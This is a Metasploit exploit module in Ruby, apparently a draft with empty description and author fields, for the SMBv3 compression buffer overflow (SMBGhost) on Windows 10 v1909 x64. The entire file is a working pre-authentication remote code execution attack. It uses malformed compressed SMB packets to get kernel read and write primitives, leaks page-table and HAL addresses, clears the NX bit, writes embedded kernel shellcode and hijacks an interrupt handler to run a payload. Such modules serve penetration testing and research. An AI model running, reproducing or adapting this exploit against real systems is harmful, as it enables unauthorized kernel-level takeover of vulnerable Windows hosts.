##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'windows_error'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::DCERPC
  # include Msf::Exploit::Remote::CheckModule
  # prepend Msf::Exploit::Remote::AutoCheck

  LZNT1 = RubySMB::Compression::LZNT1

  # todo: move this into a proper target
  OVERFLOW_VAL = 0x1100
  LOWSTUB_JMP = 0x1000600e9
  PML4_LOWSTUB_OFFSET = 0xa0
  SELFVA_LOWSTUB_OFFSET = 0x78
  HALP_APIC_REQ_INTERRUPT_OFFSET = 0x78

  KUSER_SHARED_DATA = 0xFFFFF78000000000
  PMDL_VA = KUSER_SHARED_DATA + 0x900
  PMDL_MAPVA = KUSER_SHARED_DATA + 0x800
  PMDL1_OFFSET = 0x38
  PNET_RAW_BUFF_OFFSET = 0x18
  PSHELLCODEVA = KUSER_SHARED_DATA + 0x950

  MAX_READ_RETRIES = 5
  WRITE_UNIT = 0xd0

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SMBv3 Compression Buffer Overflow',
        'Description' => %q{
        },

        'Author' =>
        [

        ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'URL', 'https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html' ],
            [ 'URL', 'https://github.com/chompie1337/SMBGhost_RCE_PoC' ],
            [ 'URL', 'https://www.youtube.com/watch?v=RSV3f6aEJFY&t=1865s' ],
          ],
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread',
            'WfsDelay' => 5
          },
        'Privileged' => true,
        'Payload' =>
          {
            'Space' => 600, # this can be more, needs to be recalculated
            'DisableNops' => true
          },
        'Platform' => 'win',
        'Targets' =>
          [
            [
              'Windows 10 v1909 x64',
              {
                'Platform' => 'win',
                'Arch' => [ARCH_X64]
              }
            ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-03-12',
        'Notes' =>
          {
            'AKA' => ['']
          }
      )
    )

    register_options(
      [
        Opt::RPORT(445),
        # OptBool.new('VERIFY_TARGET', [true, 'Check if remote OS matches exploit Target.', true]),
        # OptBool.new('VERIFY_ARCH', [true, 'Check if remote architecture matches exploit Target.', true]),
        # OptString.new('SMBUser', [false, '(Optional) The username to authenticate as', '']),
        # OptString.new('SMBPass', [false, '(Optional) The password for the specified username', '']),
        # OptString.new('SMBDomain', [false, '(Optional) The Windows domain to use for authentication', '.'])
      ]
    )
    register_advanced_options(
      [
        # OptString.new('ProcessName', [true, 'Process to inject payload into.', 'spoolsv.exe']),
        # OptInt.new('MaxExploitAttempts', [true, 'The number of times to retry the exploit.', 3]),
        # OptInt.new('GroomAllocations', [true, 'Initial number of times to groom the kernel pool.', 12]),
        # OptInt.new('GroomDelta', [true, 'The amount to increase the groom count by per try.', 5])
      ]
    )

  end

  def smb_negotiate
    # need a custom negotiate function because the responses may be corrupt while reading memory
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    packet = RubySMB::SMB2::Packet::NegotiateRequest.new
    packet.client_guid = SecureRandom.random_bytes(16)
    packet.set_dialects((RubySMB::Client::SMB2_DIALECT_DEFAULT + RubySMB::Client::SMB3_DIALECT_DEFAULT).map { |d| d.to_i(16) })

    packet.capabilities.large_mtu = 1
    packet.capabilities.encryption = 1

    nc = RubySMB::SMB2::NegotiateContext.new(
      context_type: RubySMB::SMB2::NegotiateContext::SMB2_PREAUTH_INTEGRITY_CAPABILITIES
    )
    nc.data.hash_algorithms << RubySMB::SMB2::PreauthIntegrityCapabilities::SHA_512
    nc.data.salt = "\x00" * 32
    packet.add_negotiate_context(nc)

    nc = RubySMB::SMB2::NegotiateContext.new(
      context_type: RubySMB::SMB2::NegotiateContext::SMB2_COMPRESSION_CAPABILITIES
    )
    nc.data.flags = 1
    nc.data.compression_algorithms << RubySMB::SMB2::CompressionCapabilities::LZNT1
    packet.add_negotiate_context(nc)

    dispatcher.send_packet(packet)
    dispatcher
  end

  def write_primitive(data, addr)
    dispatcher = smb_negotiate
    dispatcher.tcp_socket.get_once  # disregard the response

    uncompressed_data = rand(0x41..0x5a).chr * (OVERFLOW_VAL - data.length)
    uncompressed_data << "\x00" * PNET_RAW_BUFF_OFFSET
    uncompressed_data << [ addr ].pack('Q<')

    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(
      original_compressed_segment_size: 0xffffffff,
      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,
      offset: data.length,
      compressed_data: (data + LZNT1.compress(uncompressed_data)).bytes
    )
    dispatcher.send_packet(pkt)
    dispatcher.tcp_socket.close
  end

  def write_srvnet_buffer_hdr(data, offset)
    dispatcher = smb_negotiate
    dispatcher.tcp_socket.get_once  # disregard the response

    dummy_data = rand(0x41..0x5a).chr * (OVERFLOW_VAL + offset)
    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(
      original_compressed_segment_size: 0xffffefff,
      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,
      offset: dummy_data.length,
      compressed_data: (dummy_data + CorruptLZNT1.compress(data)).bytes
    )
    dispatcher.send_packet(pkt)
    dispatcher.tcp_socket.close
  end

  def read_primitive(phys_addr)
    value = @read_cache[phys_addr]
    return value unless value.nil?

    vprint_status("Reading from physical memory at index: #{phys_addr.to_s(16).rjust(16, '0')}")
    fake_mdl = MDL.new(
      mdl_size: 0x48,
      mdl_flags: 0x5018,
      mapped_system_va: PMDL_MAPVA,
      start_va: (PMDL_MAPVA & ~0xfff),
      byte_count: 600,
      byte_offset: ((phys_addr & 0xfff) + 0x4)
    )
    phys_addr_enc = (phys_addr & 0xfffffffffffff000) >> 12

    (MAX_READ_RETRIES * 2).times do |try|
      write_primitive(fake_mdl.to_binary_s + ([ phys_addr_enc ] * 3).pack('Q<*'), PMDL_VA)
      write_srvnet_buffer_hdr([PMDL_VA].pack('Q<'), PMDL1_OFFSET)

      MAX_READ_RETRIES.times do |_|
        dispatcher = smb_negotiate
        blob = dispatcher.tcp_socket.get_once
        dispatcher.tcp_socket.close
        next '' if blob.nil?
        next if blob[4..7] == "\xfeSMB".b
        @read_cache[phys_addr] = blob
        return blob
      end
      sleep try ** 2
    end

    fail_with(Failure::Unknown, 'failed to read physical memory')
  end

  def find_low_stub
    # most common value here is most likely going to be 0x13000
    (0x1000..0x100000).step(0x1000) do |index|
      buff = read_primitive(index)
      entry = buff.unpack('Q<').first
      next unless (entry & 0xffffffffffff00ff) == LOWSTUB_JMP

      print_status("Found low stub at physical address 0x#{index.to_s(16).rjust(16, '0')}")
      pml4 = buff[PML4_LOWSTUB_OFFSET...(PML4_LOWSTUB_OFFSET + 8)].unpack('Q<').first
      print_status("PML4 at 0x#{pml4.to_s(16).rjust(16, '0')} " + {0x1aa000 => '(BIOS)', 0x1ad000 => '(UEFI)'}.fetch(pml4, ''))

      phal_heap = buff[SELFVA_LOWSTUB_OFFSET...(SELFVA_LOWSTUB_OFFSET + 8)].unpack('Q<').first
      phal_heap &= 0xfffffffff0000000
      print_status("HAL heap found at 0x#{phal_heap.to_s(16).rjust(16, '0')}")

      return { pml4: pml4, phal_heap: phal_heap }
    end

    fail_with(Failure::Unknown, 'failed to leak the PML4 address')
  end

  def find_pml4_selfref(pointers)
    search_len = 0x1000
    index = pointers[:pml4]

    while search_len > 0
      buff = read_primitive(index)
      buff = buff[0...-(buff.length % 8)]
      buff.unpack('Q<*').each_with_index do |entry, i|
        entry &= 0xfffff000
        next unless entry == pointers[:pml4]

        selfref = ((index + (i * 8)) & 0xfff) >> 3
        pointers[:pml4_selfref] = selfref
        print_status("Found PML4 self-reference entry 0x#{selfref.to_s(16).rjust(16, '0')}")
        return pointers
      end
      search_len -= [buff.length, 8].max
      index += [buff.length, 8].max
    end

    fail_with(Failure::Unknown, 'failed to leak the PML4 self reference')
  end

  def get_phys_addr(pointers, va_addr)
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = pointers[:pml4] + pml4_index * 8
    pdpt_buff = read_primitive(pml4e)

    pdpt = pdpt_buff.unpack('Q<').first & 0xfffff000
    pdpte = pdpt + pdpt_index * 8
    pdt_buff = read_primitive(pdpte)

    pdt = pdt_buff.unpack('Q<').first & 0xfffff000
    pdte = pdt + pdt_index * 8
    pt_buff = read_primitive(pdte)

    pt = pt_buff.unpack('Q<').first
    unless pt & (1 << 7) == 0
      return (pt & 0xfffff000) + (pt_index & 0xfff) * 0x1000 + (va_addr & 0xfff)
    end

    pt &= 0xfffff000
    pte = pt + pt_index * 8
    pte_buff = read_primitive(pte)
    (pte_buff.unpack('Q<').first & 0xfffff000) + (va_addr & 0xfff)
  end

  def disable_nx(pointers, addr)
    pt = addr >> 9
    lb = (0xffff << 48) | (pointers[:pml4_selfref] << 39)
    ub = ((0xffff << 48) | (pointers[:pml4_selfref] << 39) + 0x8000000000 - 1) & 0xfffffffffffffff8
    pt = pt | lb
    pte_va = pt & ub

    phys_addr = get_phys_addr(pointers, pte_va)
    buff = read_primitive(phys_addr)
    overwrite_val = buff.unpack('Q<').first & ((1 << 63) - 1)
    write_primitive([ overwrite_val ].pack('Q<'), pte_va)
  end

  def search_hal_heap(pointers)
    va_cursor = pointers[:phal_heap]
    end_va = va_cursor + 0x2000

    while va_cursor < end_va
      phys_addr = get_phys_addr(pointers, va_cursor)
      buff = read_primitive(phys_addr)
      buff = buff[0...-(buff.length % 8)]
      values = buff.unpack('Q<*')
      window_size = 8  # using a sliding window to fingerprint the memory
      0.upto(values.length - window_size) do |i|  # todo: if the heap structure exists over two pages, this will break
        va = va_cursor + (i * 8)
        window = values[i...(i + window_size)]
        next unless window[4...8].all? { |value| value & 0xffffff0000000000 == 0xfffff80000000000 }
        next unless window[0...3].all? { |value| value & 0xfffff00000000000 == 0xfffff00000000000 }
        next unless window[3].between?(0x20, 0x40)
        next unless (window[0] - window[2]).between?(0x80, 0x180)

        phalp_apic_interrupt = read_primitive(get_phys_addr(pointers, va) + HALP_APIC_REQ_INTERRUPT_OFFSET).unpack('Q<').first
        next if read_primitive(get_phys_addr(pointers, phalp_apic_interrupt))[0...8] != "\x48\x89\x6c\x24\x20\x56\x41\x54"

        # looks legit (TM), lets hope for the best
        # use WinDBG to validate the hal!HalpInterruptController value manually
        # 0: kd> dq poi(hal!HalpInterruptController) L1
        pointers[:phalp_interrupt] = va
        print_status("Found hal!HalpInterruptController at 0x#{va.to_s(16).rjust(16, '0')}")

        # use WinDBG to validate the hal!HalpApicRequestInterrupt value manually
        # 0: kd> dq u poi(poi(hal!HalpInterruptController)+78) L1
        pointers[:phalp_apic_interrupt] = phalp_apic_interrupt
        print_status("Found hal!HalpApicRequestInterrupt at 0x#{phalp_apic_interrupt.to_s(16).rjust(16, '0')}")
        return pointers
      end

      va_cursor += buff.length
    end
    fail_with(Failure::Unknown, 'failed to leak the necessary addresses')
  end

  def build_shellcode(pointers)
    kernel_shellcode = "\x41\x50\x41\x51\x41\x55\x41\x57\x41\x56\x51\x52\x53\x56\x57\x4C"
    kernel_shellcode << "\x8D\x35\xB5\x02\x00\x00\x49\x8B\x86\xD8\x00\x00\x00\x49\x8B\x9E"
    kernel_shellcode << "\xE0\x00\x00\x00\x48\x89\x18\xFB\x48\x31\xC9\x44\x0F\x22\xC1\xB9"
    kernel_shellcode << "\x82\x00\x00\xC0\x0F\x32\x25\x00\xF0\xFF\xFF\x48\xC1\xE2\x20\x48"
    kernel_shellcode << "\x01\xD0\x48\x2D\x00\x10\x00\x00\x66\x81\x38\x4D\x5A\x75\xF3\x49"
    kernel_shellcode << "\x89\xC7\x4D\x89\x3E\xBF\x78\x7C\xF4\xDB\xE8\xE4\x00\x00\x00\x49"
    kernel_shellcode << "\x89\xC5\xBF\x3F\x5F\x64\x77\xE8\x38\x01\x00\x00\x48\x89\xC1\xBF"
    kernel_shellcode << "\xE1\x14\x01\x17\xE8\x2B\x01\x00\x00\x48\x89\xC2\x48\x83\xC2\x08"
    kernel_shellcode << "\x49\x8D\x74\x0D\x00\xE8\x09\x01\x00\x00\x3D\xD8\x83\xE0\x3E\x74"
    kernel_shellcode << "\x0A\x4D\x8B\x6C\x15\x00\x49\x29\xD5\xEB\xE5\xBF\x48\xB8\x18\xB8"
    kernel_shellcode << "\x4C\x89\xE9\xE8\x9B\x00\x00\x00\x49\x89\x46\x08\x4D\x8B\x45\x30"
    kernel_shellcode << "\x4D\x8B\x4D\x38\x49\x81\xE8\xF8\x02\x00\x00\x48\x31\xF6\x49\x81"
    kernel_shellcode << "\xE9\xF8\x02\x00\x00\x41\x8B\x79\x74\x0F\xBA\xE7\x04\x73\x05\x4C"
    kernel_shellcode << "\x89\xCE\xEB\x0C\x4D\x39\xC8\x4D\x8B\x89\x00\x03\x00\x00\x75\xDE"
    kernel_shellcode << "\x48\x85\xF6\x74\x49\x49\x8D\x4E\x10\x48\x89\xF2\x4D\x31\xC0\x4C"
    kernel_shellcode << "\x8D\x0D\xC2\x00\x00\x00\x52\x41\x50\x41\x50\x41\x50\xBF\xC4\x5C"
    kernel_shellcode << "\x19\x6D\x48\x83\xEC\x20\xE8\x38\x00\x00\x00\x48\x83\xC4\x40\x49"
    kernel_shellcode << "\x8D\x4E\x10\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xB8\x05\x00\x00"
    kernel_shellcode << "\x00\x44\x0F\x22\xC0\xE8\x19\x00\x00\x00\x48\x83\xC4\x20\xFA\x48"
    kernel_shellcode << "\x89\xD8\x5F\x5E\x5B\x5A\x59\x41\x5E\x41\x5F\x41\x5D\x41\x59\x41"
    kernel_shellcode << "\x58\xFF\xE0\xE8\x02\x00\x00\x00\xFF\xE0\x53\x51\x56\x41\x8B\x47"
    kernel_shellcode << "\x3C\x4C\x01\xF8\x8B\x80\x88\x00\x00\x00\x4C\x01\xF8\x50\x8B\x48"
    kernel_shellcode << "\x18\x8B\x58\x20\x4C\x01\xFB\xFF\xC9\x8B\x34\x8B\x4C\x01\xFE\xE8"
    kernel_shellcode << "\x1F\x00\x00\x00\x39\xF8\x75\xEF\x58\x8B\x58\x24\x4C\x01\xFB\x66"
    kernel_shellcode << "\x8B\x0C\x4B\x8B\x58\x1C\x4C\x01\xFB\x8B\x04\x8B\x4C\x01\xF8\x5E"
    kernel_shellcode << "\x59\x5B\xC3\x52\x31\xC0\x99\xAC\xC1\xCA\x0D\x01\xC2\x85\xC0\x75"
    kernel_shellcode << "\xF6\x92\x5A\xC3\xE8\xA1\xFF\xFF\xFF\x80\x78\x02\x80\x77\x05\x0F"
    kernel_shellcode << "\xB6\x40\x03\xC3\x8B\x40\x03\xC3\x41\x57\x41\x56\x57\x56\x48\x8B"
    kernel_shellcode << "\x05\x0E\x01\x00\x00\x48\x8B\x48\x18\x48\x8B\x49\x20\x48\x8B\x09"
    kernel_shellcode << "\x66\x83\x79\x48\x18\x75\xF6\x48\x8B\x41\x50\x81\x78\x0C\x33\x00"
    kernel_shellcode << "\x32\x00\x75\xE9\x4C\x8B\x79\x20\xBF\x5E\x51\x5E\x83\xE8\x58\xFF"
    kernel_shellcode << "\xFF\xFF\x49\x89\xC6\x4C\x8B\x3D\xCF\x00\x00\x00\x31\xC0\x48\x8D"
    kernel_shellcode << "\x15\x96\x01\x00\x00\x89\xC1\x48\xF7\xD1\x49\x89\xC0\xB0\x40\x50"
    kernel_shellcode << "\xC1\xE0\x06\x50\x49\x89\x01\x48\x83\xEC\x20\xBF\xEA\x99\x6E\x57"
    kernel_shellcode << "\xE8\x1E\xFF\xFF\xFF\x48\x83\xC4\x30\x48\x8B\x3D\x6B\x01\x00\x00"
    kernel_shellcode << "\x48\x8D\x35\x77\x00\x00\x00\xB9\x1D\x00\x00\x00\xF3\xA4\x48\x8D"
    kernel_shellcode << "\x35\x6E\x01\x00\x00\xB9\x58\x02\x00\x00\xF3\xA4\x48\x8D\x0D\xE0"
    kernel_shellcode << "\x00\x00\x00\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4D\x31\xC0\x4C"
    kernel_shellcode << "\x8D\x0D\x46\x00\x00\x00\x41\x50\x6A\x01\x48\x8B\x05\x2A\x01\x00"
    kernel_shellcode << "\x00\x50\x41\x50\x48\x83\xEC\x20\xBF\xC4\x5C\x19\x6D\xE8\xC1\xFE"
    kernel_shellcode << "\xFF\xFF\x48\x83\xC4\x40\x48\x8D\x0D\xA6\x00\x00\x00\x4C\x89\xF2"
    kernel_shellcode << "\x4D\x31\xC9\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xE8\xA2\xFE\xFF"
    kernel_shellcode << "\xFF\x48\x83\xC4\x20\x5E\x5F\x41\x5E\x41\x5F\xC3\x90\xC3\x48\x92"
    kernel_shellcode << "\x31\xC9\x51\x51\x49\x89\xC9\x4C\x8D\x05\x0D\x00\x00\x00\x89\xCA"
    kernel_shellcode << "\x48\x83\xEC\x20\xFF\xD0\x48\x83\xC4\x30\xC3\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
    kernel_shellcode << "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x00\x00\x00\x00"
    kernel_shellcode << "\x00\x00\x00"

    kernel_shellcode << [pointers[:phalp_interrupt] + HALP_APIC_REQ_INTERRUPT_OFFSET, pointers[:phalp_apic_interrupt]].pack('Q<*')
    kernel_shellcode + payload.encoded
  end

  def exploit
    @read_cache = {}
    pointers = find_low_stub
    pointers = find_pml4_selfref(pointers)
    pointers = search_hal_heap(pointers)

    shellcode = build_shellcode(pointers)
    disable_nx(pointers, KUSER_SHARED_DATA)
    print_status('KUSER_SHARED_DATA PTE NX bit cleared!')

    vprint_status('Transferring the payload...')
    to_write = shellcode.length
    write_bytes = 0
    while write_bytes < to_write
      write_sz = [WRITE_UNIT, to_write - write_bytes].min
      write_primitive(shellcode[write_bytes...(write_bytes + write_sz)], PSHELLCODEVA + write_bytes)
      write_bytes += write_sz
    end
    vprint_status('Transfer complete.')

    write_primitive([PSHELLCODEVA].pack('Q<'), pointers[:phalp_interrupt] + HALP_APIC_REQ_INTERRUPT_OFFSET)
  end

  module CorruptLZNT1
    def self.compress(buf, chunk_size: 0x1000)
      out = ''
      until buf.empty?
        chunk = buf[0...chunk_size]
        compressed = LZNT1::compress_chunk(chunk)

        # always use the compressed chunk, even if it's larger
        out << [ 0xb000 | (compressed.length - 1) ].pack('v')
        out << compressed

        buf = buf[chunk_size..-1]
        break if buf.nil?
      end

      out << [ 0x1337 ].pack('v')
      out
    end
  end

  class MDL < BinData::Record
    # https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_MDL
    endian :little
    uint64 :next_mdl
    uint16 :mdl_size
    uint16 :mdl_flags
    uint16 :allocation_processor_number
    uint16 :reserved
    uint64 :process
    uint64 :mapped_system_va
    uint64 :start_va
    uint32 :byte_count
    uint32 :byte_offset
  end
end
